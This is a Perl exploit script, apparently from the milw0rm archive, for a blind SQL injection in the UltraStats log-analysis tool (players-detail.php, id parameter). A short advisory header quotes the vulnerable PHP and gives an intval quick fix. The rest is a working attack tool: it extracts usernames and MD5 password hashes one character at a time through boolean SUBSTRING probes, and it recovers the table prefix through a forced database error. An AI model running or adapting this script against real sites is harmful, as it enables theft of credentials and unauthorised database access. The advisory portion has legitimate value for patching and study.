#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

#
# [!] Discovered.: DNX
# [!] Vendor.....: http://www.shooter-szene.de | http://www.ultrastats.org
# [!] Detected...: 29.06.2008
# [!] Reported...: 04.07.2008
# [!] Response...: xx.xx.2008
#
# [!] Background.: UltraStats is a very flexable log analyzing tool for Call of Duty 2 Server logfiles. 
#                  It is able to parse and consolidate the information it can gather from these logs, 
#                  and put them into a MySQL Database with a very efficient and high optimiced database 
#                  layout.
#
# [!] Bug........: $_GET['id'] in players-detail.php near line 52
#                  
#                  36: if ( isset($_GET['id']) )
#                  37: {
#                  38: 		// get and check
#                  39: 		$content['playerguid'] = DB_RemoveBadChars($_GET['id']);
#
#                  52:     		$sqlquery = "SELECT " .
#                  53:				"sum( " .STATS_ALIASES . ".Count) as Count, " .
#                  54:				STATS_ALIASES . ".Alias as Aliases_Alias, " .
#                  55:				STATS_ALIASES . ".AliasAsHtml as Aliases_AliasAsHtml" .
#                  56:				" FROM " . STATS_ALIASES .
#                  57:				" WHERE PLAYERID = " . $content['playerguid'] . " " .
#                  58:				GetCustomServerWhereQuery(STATS_ALIASES, false) .
#                  59:				" GROUP BY " . STATS_ALIASES . ".Alias " .
#                  60:				" ORDER BY Count DESC";
#
# [!] Tested on..: v0.2.136, v0.2.142
#
# [!] Solution...: no update from vendor till now
#
# [!] Quick fix..: in players-detail.php line 39:
#
#                  - replace:
#                      $content['playerguid'] = DB_RemoveBadChars($_GET['id']);
#
#                  - with:
#                      $content['playerguid'] = intval(DB_RemoveBadChars($_GET['id']));
#

if(!$ARGV[1])
{
  print "\n                                  \\#'#/                              ";
  print "\n                                  (-.-)                               ";
  print "\n   --------------------------oOO---(_)---OOo--------------------------";
  print "\n   | Ultrastats <= v0.2.142 (players-detail.php) Blind SQL Injection |";
  print "\n   |                          coded by DNX                           |";
  print "\n   ------------------------------------------------------------------";
  print "\n[!] Usage: perl ultrastats.pl [Host] [Path] <Options>";
  print "\n[!] Example: perl ultrastats.pl 127.0.0.1 /ultrastats/ -o 2 -i 123 -l 2 -t users";
  print "\n[!] Options:";
  print "\n       -o [no]       1 = username (default)";
  print "\n                     2 = password";
  print "\n                     3 = find database prefix (error based)";
  print "\n       -i [no]       Valid GUID, default is 1";
  print "\n       -l [no]       Limitation in sql query, -l 0 shows the first row,";
  print "\n                     -l 1 the second one and so on, default is 0";
  print "\n       -t [name]     Changed the user table name, default is stats_users";
  print "\n       -p [ip:port]  Proxy support";
  print "\n";
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $target  = "username";
my $user    = 1;
my $limit   = 0;
my $table   = "stats_users";
my %options = ();
GetOptions(\%options, "o=i", "i=i", "l=i", "t=s", "p=s");

print "[!] Exploiting...\n";

if($options{"i"})
{
  $user = $options{"i"};
}

if($options{"l"})
{
  $limit = $options{"l"};
}

if($options{"t"})
{
  $table = $options{"t"};
}

if($options{"o"} == 1)
{
  $target = "username";
  get_username();
}
elsif($options{"o"} == 2)
{
  $target = "password";
  get_password();
}
elsif($options{"o"} == 3)
{
  get_prefix();
}

sub get_username()
{
  syswrite(STDOUT, "[!] Username: ", 14);
  for(my $i = 1; $i <= 32; $i++)
  {
    my $found = 0;
    my $h = 48;
    while(!$found && $h <= 57)
    {
      if(istrue2($host, $path, $table, $i, $h))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
    if(!$found)
    {
      $h = 64;
      while(!$found && $h <= 122)
      {
        if(istrue2($host, $path, $table, $i, $h))
        {
          $found = 1;
          syswrite(STDOUT, chr($h), 1);
        }
        $h++;
      }
    }
  }  
}

sub get_password()
{
  syswrite(STDOUT, "[!] MD5-Hash: ", 14);
  for(my $i = 1; $i <= 32; $i++)
  {
    my $found = 0;
    my $h = 48;
    while(!$found && $h <= 57)
    {
      if(istrue2($host, $path, $table, $i, $h))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
    if(!$found)
    {
      $h = 97;
      while(!$found && $h <= 102)
      {
        if(istrue2($host, $path, $table, $i, $h))
        {
          $found = 1;
          syswrite(STDOUT, chr($h), 1);
        }
        $h++;
      }
    }
  }
}

sub get_prefix()
{
  my $ua = LWP::UserAgent->new;
  my $url = "http://".$host.$path."players-detail.php?id=".$user."'";
  
  if($options{"p"})
  {
    $ua->proxy('http', "http://".$options{"p"});
  }
  
  my $response = $ua->get($url);
  my $content = $response->content;
  
  $content =~ /^Database error: Invalid SQL: SELECT sum\( (.*?)_aliases.Count\) as Count,/;
  print "[!] Prefix: ".$1;
}

print "\n[!] Exploit done\n";

sub istrue2
{
  my $host  = shift;
  my $path  = shift;
  my $table = shift;
  my $i     = shift;
  my $h     = shift;
  
  my $ua = LWP::UserAgent->new;
  my $url = "http://".$host.$path."players-detail.php?id=".$user."%20AND%20SUBSTRING((SELECT%20".$target."%20FROM%20".$table."%20LIMIT%20".$limit.",1),".$i.",1)=CHAR(".$h.")";
  
  if($options{"p"})
  {
    $ua->proxy('http', "http://".$options{"p"});
  }
  
  my $response = $ua->get($url);
  my $content = $response->content;
  
  my $regexp = "Top Hitlocations where you got killed by others";
  my $regexp2 = "Meist genutzte Aliases";
  
  if($content =~ /$regexp/ || $content =~ /$regexp2/)
  {
    return 1;
  }
  else
  {
    return 0;
  }
}

# milw0rm.com [2008-07-13]